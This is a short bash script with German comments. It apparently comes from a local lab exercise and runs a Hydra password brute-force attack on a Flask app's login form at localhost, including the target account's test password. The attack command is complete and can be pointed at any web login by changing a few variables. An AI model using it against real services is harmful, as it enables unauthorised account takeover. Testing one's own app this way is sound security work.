#!/bin/bash
# ============================================
# Hydra Bruteforce für Flask Login
# ============================================
#
# Installation (Windows):
#   Via WSL oder Cygwin, oder Download von:
#   https://github.com/vanhauser-thc/thc-hydra
# ============================================

# Konfiguration
# Für macOS: Localhost verwenden (für WSL/Linux war es: ip route | grep default | awk '{print $3}')
TARGET="127.0.0.1"
PORT="5001"
USERNAME="marc"                 # Zu testender Benutzername (Passwort: 12345)
PASSWORD_FILE="passwords.txt"       # Passwortliste

# Login-Endpunkt und Parameter
LOGIN_PATH="/login"
FAIL_STRING="Ungültige Eingabedaten"  # Fehlermeldung bei falschem Login

echo "========================================"
echo "Hydra Bruteforce Attack gestartet"
echo "========================================"
echo "Target: http://${TARGET}:${PORT}${LOGIN_PATH}"
echo "Username: ${USERNAME}"
echo "Password-Liste: ${PASSWORD_FILE}"
echo ""

# Hydra Command für HTTP-POST-Form
# -l = Login/Username
# -P = Password-Liste
# -V = Verbose (zeigt jeden Versuch)
# -f = Stop bei erstem Erfolg
# http-post-form = HTTP POST Form Attack
# Format: "path:post-data:fail-condition"

hydra -l "${USERNAME}" \
      -P "${PASSWORD_FILE}" \
      -t 8 \
      -V \
      -f \
      -s "${PORT}" \
      "${TARGET}" \
      http-post-form "${LOGIN_PATH}:username=^USER^&password=^PASS^:F=${FAIL_STRING}"

echo ""
echo "========================================"
echo "Hydra Bruteforce beendet"
echo "========================================"

# ALTERNATIVE: Mit mehreren Threads (schneller)
# Füge -t 16 hinzu für 16 parallele Threads:
#
# hydra -l "${USERNAME}" \
#       -P "${PASSWORD_FILE}" \
#       -t 16 \
#       -V -f \
#       "${TARGET}" \
#       -s "${PORT}" \
#       http-post-form "${LOGIN_PATH}:username=^USER^&password=^PASS^:${FAIL_STRING}"
